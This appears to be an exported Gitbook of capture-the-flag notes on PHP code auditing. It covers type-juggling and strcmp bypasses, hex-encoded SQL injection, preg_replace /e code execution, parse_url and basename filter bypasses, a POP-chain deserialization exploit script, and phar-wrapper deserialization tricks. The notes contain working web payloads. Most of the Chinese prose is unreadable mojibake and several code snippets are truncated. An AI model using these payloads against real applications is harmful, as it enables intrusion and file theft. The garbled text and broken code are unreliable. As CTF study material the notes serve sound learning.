¹æ®MD5çš„ç‰¹æ€§ï¼šåœ¨ä¸¤ä¸ªMD5ç›¸åŒçš„æ–‡ä»¶åï¼Œå¦‚æœé™„åŠ ä¸ŠMD5ç›¸åŒçš„æ•°æ®ï¼Œç”Ÿæˆçš„ä¸¤ä¸ªæ–‡ä»¶MD5ä¾æ—§ç›¸åŒï¼ˆè™½ç„¶MD5ä¼šå˜ï¼Œä½†æ˜¯ä¸¤ä¸ªæ–‡ä»¶MD5ç›¸åŒï¼‰ã€‚å°±æ˜¯è¿™ä¸ªå…¬å¼ï¼š hash(A) = hash(B) -> hash(A + C) = hash(B + C) æ ¹æ®è¿™ä¸ªç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“è®ºï¼š åˆ©ç”¨fastcollï¼Œå¯ä»¥å¯¹å›ºå®šå¼€å¤´å’Œå›ºå®šç»“å°¾çš„æ•°æ®ï¼Œç”Ÿæˆä¸¤ç»„ä¸åŒçš„æ•°æ®ï¼ˆæ•°æ®å†…å®¹ä¸å¯æ§ï¼‰æ‹¼æ¥ä¸Šå¤´å’Œå°¾ï¼Œåˆ†åˆ«ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼Œä¿è¯ä»–ä»¬çš„MD5ç›¸åŒã€‚ è¯­è¨€æ„é€ å™¨ [è¯­è¨€æ„é€ å™¨å’Œå˜é‡å‡½æ•°]https://segmentfault.com/q/1010000000188609 å½“è§£é‡Šå™¨é‡åˆ°ï¼š echo 'Hello world'; è¿™æ ·çš„ä¸€ä¸ªè¡¨è¾¾å¼çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šæŠŠå®ƒè½¬æ¢æˆå‡½æ•°è°ƒç”¨ï¼Œè€Œæ˜¯ç›´æ¥æ˜ å°„åˆ°ä¸€ç³»åˆ—é¢„å…ˆå®šä¹‰å¥½çš„æ“ä½œã€‚ä½¿ç”¨è¯­è¨€æ„æˆçš„æ—¶å€™å¯ä»¥åŠ æ‹¬å·ï¼Œä¹Ÿå¯ä»¥ä¸åŠ æ‹¬å·ï¼Œä½†æ˜¯ä½¿ç”¨å‡½æ•°çš„æ—¶å€™å¿…é¡»åŠ æ‹¬å·ã€‚ ç²¾åº¦ç¼ºé™· phpæœ€å¤§ç²¾åº¦æ˜¯14ä½ï¼Œå¦‚æœè¶…å‡º14ä½ä¼šè¡°å‡ if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2) { echo 'success'; } payload trick1=0.1&trick2=0.100000000000001 éƒ½ä¸ºINF/NAN(æå°/æå¤§) strcmp()--æ•°å€¼æ¯”è¾ƒ ä½¿ç”¨æ¡ä»¶ï¼šphp>=5.3 å½“ç¨‹åºé€»è¾‘è¿›è¡Œäº†æ•°å€¼çš„æ¯”è¾ƒæ—¶ï¼Œå¯ä»¥å°è¯•æ¯”è¾ƒå‡½æ•°æ˜¯å¦ä¸ºstrcmp() int strcmp ( string $str1 , string $str2 ) å¦‚æœ str1 å°äº str2 è¿”å› 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚(åŒºåˆ†å¤§å°å†™) ä½†æ˜¯strcmp()æ¯”è¾ƒçš„å¯¹è±¡æ˜¯å­—ç¬¦ä¸²å’Œæ•°ç»„çš„æ—¶å€™ï¼Œè™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä»ç„¶ä¼šç›´æ¥è¿”å›0ï¼Œè¿™æ ·é€šè¿‡æŠŠç›®æ ‡å˜é‡è®¾ç½®æˆæ•°ç»„å°±å¯ä»¥ç»•è¿‡è¯¥å‡½æ•°çš„é™åˆ¶ã€‚ #php7.0 >>Warning: strcmp() expects parameter 2 to be string, array given in /usercode/file.php on line 3 Success! intval()--php5 is_numericï¼ˆï¼‰ $s = is_numeric($_GET['s'])?$_GET['s']:0; $sql=\"insert into test(type)values($s);\"; //æ˜¯ values($s) ä¸æ˜¯values('$s') mysql_query($sql); ä¸Šé¢è¿™ä¸ªç‰‡æ®µç¨‹åºæ˜¯åˆ¤æ–­å‚æ•°sæ˜¯å¦ä¸ºæ•°å­—ï¼Œæ˜¯åˆ™è¿”å›æ•°å­—ï¼Œä¸æ˜¯åˆ™è¿”å›0ï¼Œç„¶åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ï¼ˆè¿™æ ·å°±æ„é€ ä¸äº†sqlè¯­å¥ï¼‰ æˆ‘ä»¬å¯ä»¥æŠŠâ€˜1 or 1' è½¬æ¢ä¸º16è¿›åˆ¶ 0x31206f722031 ä¸ºså‚æ•°çš„å€¼ l array_search/in_array å¤§æµ·æé’ˆï¼Œåœ¨å¤§æµ·ï¼ˆhaystackï¼‰ä¸­æœç´¢é’ˆï¼ˆ needleï¼‰ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½® strict åˆ™ä½¿ç”¨å®½æ¾çš„æ¯”è¾ƒã€‚ å‚æ•°ï¼š(mixed $needle, array $haystack, bool $strict = false): bool å½“æ¨¡å¼ä¸ºfalseæ—¶ï¼Œå…¶æŸ¥æ‰¾æ˜¯é€šè¿‡==æ¥æ¯”è¾ƒçš„ å½“æ¨¡å¼ä¸ºtrueæ—¶ï¼Œå…¶æŸ¥æ‰¾æ˜¯é€šè¿‡===æ¥æ¯”è¾ƒçš„ escapeshellargå’Œescapeshellcmd https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html https://www.anquanke.com/post/id/107336 preg preg-matchï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•è·åˆ†ç»„ï¼‰ preg_match()è¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸ºpreg_match()åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ã€‚ æ¼æ´ 1.å‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼Œä¼ é€’æ•°ç»„è¿”å›false 2.åˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡ phpä½ç‰ˆæœ¬ 2.é/sæ¨¡å¼ä¸‹ä¸åŒ¹é…æ¢è¡Œç¬¦%0a 3.é/mæ¨¡å¼ä¸‹ä¸åŒ¹é…å¤šè¡Œ preg_replaceï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ›¿æ¢å­—ç¬¦ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ›¿æ¢æ¬¡æ•°ï¼‰ æ›¿æ¢æ¬¡æ•°é»˜è®¤ä¸º1ï¼Œå¯ä»¥ç”¨åŒå†™ç»•è¿‡ /eæ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ ï¼ˆphp5.5ç‰ˆæœ¬ä»¥ä¸‹ï¼‰ buu--[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤ $value){ echo complexStrtolower($regex, $value) . \"\\n\"; } highlight_file(__FILE__); ?> åœ¨/eæ¨¡å¼ä¸‹ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…æˆåŠŸï¼Œå°±ä¼šæ‰§è¡Œpreg_replace()çš„ç¬¬äºŒä¸ªå‚æ•° ç›¸å½“äº eval('strtolower(\"\\1\");') å¦‚ä½•åˆ©ç”¨\\1å®ç°ä»£ç æ‰§è¡Œå‘¢ï¼Ÿ æ³¨æ„åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ‰€ä»£è¡¨çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ˜¯å°†åŒ¹é…åˆ°çš„å­—ç¬¦ä½œä¸ºæ•è·åˆ†ç»„ï¼Œè€Œæ•è·åˆ†ç»„ä¸‹æ ‡æ˜¯ä»1å¼€å§‹çš„ï¼Œå³åŒ¹é…åˆ°çš„å­—ç¬¦ä¼šä»£æ›¿\\1â†’eval('strtolower(\"payload\");') è¿˜æœ‰ä¸€ä¸ªæ³¨æ„ç‚¹æ˜¯\"payload\"æ˜¯ç”±åŒå¼•å·åŒ…å›´èµ·æ¥çš„ï¼Œå†é…åˆå¯å˜å˜é‡ï¼Œæ‰èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ã€‚ payload \\S*=${phpinfo()} \\S*â†’$regex ç”¨äºæ­£åˆ™åŒ¹é…/æ•è· ${phpinfo()}â†’$value å¾…åŒ¹é…å­—ç¬¦ ${phpinfo()}:è¦å°†å¾…åŒ¹é…å­—ç¬¦æ„é€ æˆå¯å˜å˜é‡çš„å½¢å¼æ‰å¯ä»¥æ‰§è¡Œphpinfo() å¯å˜å˜é‡ï¼š >> hello world basename basenameä¼šå¿½ç•¥ä¸€äº›å¥‡æ€ªçš„å­—ç¬¦%80 ~ %ffã€‚ buu ----[Zer0pts2020]Can you guess it? include 'config.php'; // FLAG is defined in config.php if (preg_match('config\\.php\\/*$', $_SERVER['PHP_SELF'])) { exit(\"I don't know what you are thinking, but I won't let you read it :)\"); } if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit(); } ç›®æ ‡ï¼šbasename($_SERVER['PHP_SELF']==config.php éœ€è¦ç»•è¿‡è¿‡æ»¤config.php\\/*$ï¼Œ$åŒ¹é…æœ«å°¾ï¼Œæ‰€ä»¥åªè¦åœ¨config.phpåæ·»åŠ å­—ç¬¦å³å¯ç»•è¿‡ã€‚ $_SERVER['PHP_SELF']ï¼šè¿”å›çš„æ˜¯å½“å‰æ–‡ä»¶ç›¸å¯¹äºæ ¹ç›®å½•çš„è·¯å¾„host/$_SERVER[\"PHP_SELF\"]å³url==host/$_SERVER[\"PHP_SELF\"] basenameï¼šè¿”å›å½“å‰æ–‡ä»¶åå³æœ€åä¸€ä¸ª/xxxä¸­çš„xxx ä¸ºäº†ç»•è¿‡æ­£åˆ™ï¼Œéœ€è¦åœ¨1.phpååŠ å­—ç¬¦ ä½†æ˜¯è¿™æ ·basenameåŒ¹é…åˆ°çš„å°±ä¸æ˜¯1.phpäº† ä¸è¿‡basenameæœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯ï¼šå¦‚æœåŒ¹é…åˆ°çš„æ–‡ä»¶åå¤´æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¼šæŠŠå®ƒå¿½ç•¥æ‰ è¿™æ ·basenameåŸå…ˆåŒ¹é…åˆ°çš„æ˜¯%81ï¼Œä½†æ˜¯%81æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä¼šæŠŠå®ƒå¿½ç•¥æ‰ï¼Œæ‰€ä»¥å°±ä¼šå¾€å‰åŒ¹é…ï¼ŒåŒ¹é…åˆ°1.php ä¼ªéšæœºæ•° mt_srand(x):è®¾å®šéšæœºæ•°ç§å­ä¸ºx mt_rand(a,b):ç”Ÿæˆ[a,b]é—´çš„éšæœºæ•° éšæœºæ•°ç”Ÿæˆå‡½æ•°ï¼Œå®è´¨ä¸Šç”Ÿæˆçš„æ˜¯çº¿æ€§çš„ä¼ªéšæœºæ•°ï¼Œç®€å•æ¥è¯´å°±æ˜¯y=axï¼Œxå°±æ˜¯ç§å­ï¼Œaæ˜¯èŒƒå›´ï¼Œyå°±æ˜¯ç”Ÿæˆçš„éšæœºæ•°ã€‚ æ‰€ä»¥åªè¦ç§å­å›ºå®šäº†ï¼Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°éƒ½æ˜¯ç›¸åŒçš„ã€‚ å·²çŸ¥åœ¨åŒä¸€ä¸ªç§å­ä¸‹ç”Ÿæˆçš„å¤šä¸ªéšæœºæ•° https://blog.csdn.net/weixin_34255793/article/details/92713300 ä½¿ç”¨php_mt_seedå¯¹ç¬¬ä¸€ä¸ªéšæœºæ•°è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°å¯èƒ½çš„ç§å­ï¼ˆå› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨mt_rand()å‡½æ•°çš„æ—¶å€™ç§å­å°±ç¡®å®šä¸‹æ¥äº†ï¼‰ ç„¶åç”¨å¾—åˆ°çš„ç§å­æ¥ç”Ÿæˆéšæœºæ•°ï¼Œè¿›è¡Œæ¯”å¯¹å³å¯å¾—åˆ°æ­£ç¡®çš„ç§å­ å·²çŸ¥ç¬¬ä¸€ä¸ªéšæœºæ•° https://blog.csdn.net/qq_52907838/article/details/119824220 php_mt_seedä¸­ç»™å‡ºçš„æ–¹æ³• å¯¹åº”è„šæœ¬ å…³äºphp_mt_seed https://www.openwall.com/php_mt_seed/ $_SERVERå˜é‡ç¼ºé™· '; echo ''; echo '$_SERVER[QUERY_STRING] '; var_dump($_SERVER['QUERY_STRING']); echo ''; echo ''; echo '$_REQUEST '; var_dump($_REQUEST); echo ''; echo ''; echo '$_SERVER '; var_dump($_SERVER); echo ''; echo ''; $_SERVER['PHP_SELF']ï¼šè¿”å›çš„æ˜¯å½“å‰æ–‡ä»¶ç›¸å¯¹äºæ ¹ç›®å½•çš„è·¯å¾„host/$_SERVER[\"PHP_SELF\"]å³url==host/$_SERVER[\"PHP_SELF\"] parse_url ä½¿ç”¨æ–¹æ³• ç”¨äºè§£æurlï¼Œè·å¾—urlçš„ç»„æˆéƒ¨åˆ† '; $parts = parse_url($url); var_dump($parts); ?> >> http://www.zcool.com.cn/suning?p=69#tab_anchorarray(5) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(16) \"www.zcool.com.cn\" [\"path\"]=> string(7) \"/suning\" [\"query\"]=> string(4) \"p=69\" [\"fragment\"]=> string(10) \"tab_anchor\" } æ¼æ´ ä¸åº”è¯¥å°†å…¶ä½œä¸ºæ£€éªŒurlæ˜¯å¦åˆæ³•çš„æ‰‹æ®µ è§£æå¤±è´¥ #/test/1.php http://127.0.0.1/test/1.php?aaa=1 æˆ‘ä»¬æŸ¥è¯¢çš„å­—ç¬¦ä¸²è¢«æ‹¦æˆªï¼Œæ²¡æœ‰è¾“å‡ºa=1 http://127.0.0.1///test/1.php?aaa=1 åœ¨æ­£å¸¸è·¯å¾„å‰åŠ ä¸Š//ï¼Œparse_urlå°±ä¼šè§£æå¤±è´¥ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ï¼ŒæˆåŠŸè¾“å‡ºa=1 ç«¯å£è§£æé”™è¯¯ php5.5ä»¥ä¸Š >> array(3) { [\"host\"]=> string(11) \"pupiles.com\" [\"port\"]=> int(1234) [\"path\"]=> string(11) \"/about:1234\" } parse_urlè§£æå‡ºäº†ç«¯å£å·ï¼Œè®¤ä¸ºè®¿é—®çš„æ˜¯pupiles.comçš„1234ç«¯å£ä¸‹çš„about:1234æ–‡ä»¶ï¼Œè€Œå®é™…ä¸Šæ˜¯è®¿é—®pupiles.comä¸‹çš„about:1234æ–‡ä»¶ è·¯å¾„è§£æé”™è¯¯ >> Array ( [path] => /upload ) Array ( [host] => upload ) å¯ä»¥çœ‹åˆ°parse_urlè§£ææ—¶ï¼Œ/xxxè§£æä¸ºè·¯å¾„ï¼Œ//xxxè§£æä¸ºä¸»æœº is_file if($file == \"f14g.php\" OR is_file($file)) { echo file_get_contents($file); } else{ echo false; } ä¼ªåè®® is_fileæ£€æµ‹é™¤äº†fileå¤–çš„ä¼ªåè®®éƒ½æ˜¯false å‡ç›®å½• ./xxx/../f14g.php strip_tags if (strstr(strtolower($file['name']), \".php\") ) { return false; } $file['name'] = strip_tags($file['name']); payload $file['name']=1.<>php Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 18:49:36 "},"03.ä»£ç å®¡è®¡/PHP/phpååºåˆ—åŒ–.html":{"url":"03.ä»£ç å®¡è®¡/PHP/phpååºåˆ—åŒ–.html","title":"PHPååºåˆ—åŒ–","keywords":"","body":"æ¦‚å¿µ åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬åŒ–ä¸ºæ•°æ®å­—èŠ‚æµï¼Œååºåˆ—åŒ–æ˜¯å°†æ•°æ®å­—èŠ‚æµè½¬æ¢æˆå¯¹è±¡ã€‚ä¾‹å¦‚javaé‡‡ç”¨äºŒè¿›åˆ¶åºåˆ—ï¼ŒPHPé‡‡ç”¨å¯è§å­—ç¬¦ä¸²åºåˆ—ã€‚ PHPååºåˆ—åŒ–æ¼æ´ä¸»è¦å‘ç”Ÿåœ¨ååºåˆ—åŒ–æœŸé—´ä¸€äº›é­”æœ¯æ–¹æ³•çš„è‡ªåŠ¨è°ƒç”¨ä¸Š åºåˆ—åŒ– éç±»åºåˆ—åŒ– ç›¸æ¯”äºç±»åºåˆ—åŒ–å°‘äº†å¯¹è±¡åé•¿åº¦å’Œå¯¹è±¡åç§° 1,'b'=>2); echo serialize($b); ?> >>s:8:\"flag.php\" >>a:2:{s:1:\"a\";i:1;s:1:\"b\";i:2;} ç±»åºåˆ—åŒ– name = 18 } } $a=new info(); echo serialize($a); ?> å¯ä»¥å‘ç°åºåˆ—åŒ–æ—¶åªä¼šåºåˆ—åŒ–ç±»çš„å±æ€§ï¼Œè€Œä¸ä¼šåºåˆ—åŒ–ç±»çš„æ–¹æ³•ã€‚ ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“ >>O:4:\"info\":3:{s:4:\"name\";i:19;s:4:\"*b\";s:3:\"123\";s:7:\"infoc\";s:4:\"khaz\";} å¦‚æœä»”ç»†è§‚å¯Ÿä¼šå‘ç°protectedå’Œprivateå˜é‡åºåˆ—åŒ–åå˜é‡åé•¿åº¦å‘ç”Ÿäº†å˜åŒ– s:4:\"*b\"; s:7:\"infoc\" æˆ‘ä»¬ç”¨010æ‰“å¼€1.txt â€‹ å¯ä»¥å‘ç°protectedåºåˆ—åŒ–åï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š%00*%00 â€‹ è€Œprivateåºåˆ—åŒ–åï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š%00ç±»å%00 åœ¨å®é™…è¿ç”¨ä¸­å¯ä»¥ç”¨\\00ï¼ˆç©ºï¼‰ç”¨%00ä»£æ›¿ åŸå› ï¼šphpçš„urlencode()ä¼šè‡ªåŠ¨æŠŠç©ºç¼–ç æˆ%00 é­”æœ¯æ–¹æ³• PHP: é­”æœ¯æ–¹æ³• - Manual å¸¸è§ //ç±»çš„æ„é€ å‡½æ•°ï¼Œåˆ›å»ºç±»å¯¹è±¡æ—¶è°ƒç”¨ __construct() //ç±»çš„ææ„å‡½æ•°ï¼Œå¯¹è±¡é”€æ¯æ—¶è°ƒç”¨ __destruct() //æ‰§è¡Œserialize()æ—¶ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è°ƒç”¨constructå‡½æ•° __sleep() //æ‰§è¡Œunserialize()æ—¶ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è°ƒç”¨destructå‡½æ•° __wakeup() /* å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶è§¦å‘ $name: è¢«è°ƒç”¨æ–¹æ³•çš„åå­— $argumentsï¼šä¼ é€’ç»™è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•° */ __call(string $name, array $arguments) /* ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶ 1.è¾“å‡ºå¯¹è±¡ï¼šecho/printç­‰ 2.å‡½æ•°çš„å‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œå°†å¯¹è±¡ä½œä¸ºå‚æ•°æ—¶ */ __toString() __invoke() å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ >>è§¦å‘äº†ivokeé­”æœ¯æ–¹æ³• ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§ èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨ã€‚ è¯»å–æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚ è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ã€‚ è°ƒç”¨ unset() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨ã€‚ å…¶ä»– __set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ __clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨ __autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±» __debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯ ååºåˆ—åŒ–æ¼æ´ åŸç† æœ‰åºåˆ—åŒ–å°±æœ‰ååºåˆ—åŒ–ï¼Œæ¼æ´ç‚¹å°±äº§ç”Ÿäºååºåˆ—åŒ–æ—¶ã€‚ å› ä¸ºåºåˆ—åŒ–æ•°æ®ä¸­å­˜å‚¨çš„æ˜¯ç±»å¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œæ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œè¦†ç›–å˜é‡ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚ æ”»å‡»æ€è·¯ å®šä½åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä»£ç ï¼Œæ‰¾åˆ°å¯æ§å‚æ•°å’Œååºåˆ—åŒ–å¯¹è±¡ æ˜ç¡®è¦åˆ©ç”¨çš„æ–¹æ³•å’Œå±æ€§ æ ¹æ®å…¶æ‰€åœ¨ç±»çš„é­”æœ¯æ–¹æ³•æ„é€ popé“¾ï¼ˆä¼ å…¥å‚æ•°åˆ°è§¦å‘å…³é”®å‡½æ•°,æ³¨æ„ç±»å±æ€§çš„ç±»å‹ï¼‰ åœ¨ PHP7.2+çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ public ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åæˆå‘˜ä¹Ÿä¼šè¢« public è¦†ç›–ä¿®é¥°ã€‚ ä¼ é€’æ„é€ å¥½çš„åºåˆ—åŒ–å†…å®¹(æœ€å¥½è¦urlencodeä¸€ä¸‹)ï¼Œè§¦å‘ååºåˆ—åŒ–ï¼Œå®Œæˆæ”»å‡» Demo str->flag; } } class get { private $flag; public function __get($name) { include($name.$this->flag); return $flag;//flag in flag.php } } if(isset($_GET['a'])) { $a = unserialize($_GET['a']); echo $a; } else { highlight_file(__FILE__); } è¿™é‡Œç›®çš„æ˜¯è¦è§¦å‘ get() è¿™ä¸ªå‡½æ•°ï¼Œé­”æœ¯æ–¹æ³•get()ä¼šåœ¨ç”±å¤–éƒ¨è®¿é—®å¯¹è±¡ä¸­çš„ç§æœ‰å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œå…¶ä¸­å‚æ•°ä¼ªè®¿é—®å±æ€§çš„å±æ€§åã€‚å†è§‚å¯Ÿexampleè¿™ä¸ªç±»ï¼Œè¿™é‡Œå‘ç° toStrong() æ–¹æ³•ï¼Œè€Œåˆå­˜åœ¨ echo $a è¿™å¥ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šè¦æ„é€ çš„è¿™ä¸ª $a å°±æ˜¯ exampleè¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œè€Œä¸”è¿™ä¸ªå¯¹è±¡ä¸­çš„å±æ€§ $flag ä¹Ÿåº”ä¸º get è¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œä»è€Œ æ‰§è¡Œ return $this->str->flagæ—¶å°±ä¼šè·³è½¬åˆ° get å¯¹è±¡çš„ é­”æœ¯æ–¹æ³• get($name) ï¼ˆ$nameä¸ºè¦è®¿é—®çš„ç§æœ‰å±æ€§çš„åç§°ï¼Œå³ flag è¿™ä¸ªå±æ€§åï¼‰ã€‚ å³é“¾å­ä¸º ååºåˆ—åŒ–å…¥å£unserialize() â†’ example::__tostring() â†’ get::__get() â†’ æ‰§è¡Œå±é™©æ“ä½œinclude() ä¹‹åè¦ include 'flag.php'ï¼Œç”±äº$name == flagï¼Œæ‰€ä»¥è¦æ„é€  $flag == â€˜.phpâ€™ ï¼Œæ‹¼æ¥èµ·æ¥å°±å¯ä»¥åŒ…å« â€˜flag.phpâ€™ ä»è€Œæ‹¿åˆ°flagã€‚ å³ flag = $flag; } } $a = new example(); $b = new get('.php'); $a->str = $b; echo urlencode(serialize($a)); pharååºåˆ—åŒ–--PHP pharæ˜¯ä»€ä¹ˆ åŠŸèƒ½ï¼šå‹ç¼©æ–‡ä»¶ï¼Œå°†å†…å®¹åºåˆ—åŒ–å­˜å‚¨ å¦‚ä½•ç”Ÿæˆï¼š æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOff,å¹¶åˆ é™¤å‰é¢çš„;å¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚ startBuffering(); //è®¾ç½®stub $phar->setStub(\"\"); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $a = new User(); $phar->setMetadata($a); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar->addFromString(\"test.txt\", \"test\"); //ç­¾åè‡ªåŠ¨è®¡ç®— $phar->stopBuffering(); ?> æ–‡ä»¶æ ¼å¼ ç”¨010æ‰“å¼€ç”Ÿæˆçš„test.pharï¼Œè§‚å¯Ÿpharæ–‡ä»¶çš„å››ä¸ªç»„æˆéƒ¨åˆ† â€‹ å…³æ³¨stubå’Œmanifest â€‹ stubï¼špharè¯†åˆ«æ ‡å¿—ï¼Œåªè¦æœ‰äº†è¿™ä¸ªè¯†åˆ«æ ‡å¿—ï¼Œå³ä½¿åç¼€åä¸ä¸ºpharï¼Œphpä»èƒ½å¤Ÿå°†æ–‡ä»¶è¯†åˆ«ä¸ºpharæ–‡ä»¶ â€‹ manifestï¼šè¿™ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼Œæ˜¯ååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹ â€‹ signatureï¼šå½“æˆ‘ä»¬éœ€è¦æ”¹å˜pharæ–‡ä»¶å†…å®¹æ—¶ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆç­¾å â€‹ æ¼æ´æˆå›  pharä¸­manifestæ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–. æ³¨æ„ï¼šä½¿ç”¨phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œè¦ä½¿ç”¨æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ 3.å—åˆ°å½±å“çš„å‡½æ•° From https://blog.zsxsoft.com/post/38?from=timeline&isappinstalled=0 â€‹ ç»•è¿‡ ç»•è¿‡pharå¼€å¤´ compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/read=convert.base64-encode/resource=phar://phar.phar ç»•è¿‡pharæ ‡è¯†ç¬¦ gzip phar.phar #ä½¿ç”¨å‹ç¼©åpharæ–‡ä»¶åŒæ ·ä¹Ÿèƒ½ååºåˆ—åŒ– ç»•è¿‡æ–‡ä»¶åç¼€å’Œå†…å®¹ â€‹ å°†1.pharæ”¹åä¸º1.jpgï¼Œå†ç»™å‹ç¼©gzip 1.jpgå¾—åˆ°1.jpg.gzæ–‡ä»¶ï¼Œä¿®æ”¹åå­—ä¸º1.jpgä¸Šä¼  sessionååºåˆ—åŒ– https://xz.aliyun.com/t/6640#toc-5 sessionå·¥ä½œæµç¨‹ sessionåºåˆ—åŒ– PHP sessionçš„å­˜å‚¨æœºåˆ¶æ˜¯ç”±session.serialize_handleræ¥å®šä¹‰å¼•æ“çš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼Œä¸”å­˜å‚¨çš„æ–‡ä»¶æ˜¯ç”±sess_sessionidæ¥å†³å®šæ–‡ä»¶åçš„ã€‚ é€šå¸¸æ–‡ä»¶åä¸ºsess_sessionidçš„å½¢å¼ï¼Œé»˜è®¤çš„å¼•æ“æ˜¯php äº§ç”Ÿçš„åŸå›  sessionåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨åˆ°çš„å¼•æ“ä¸åŒ ä¾‹å¦‚ 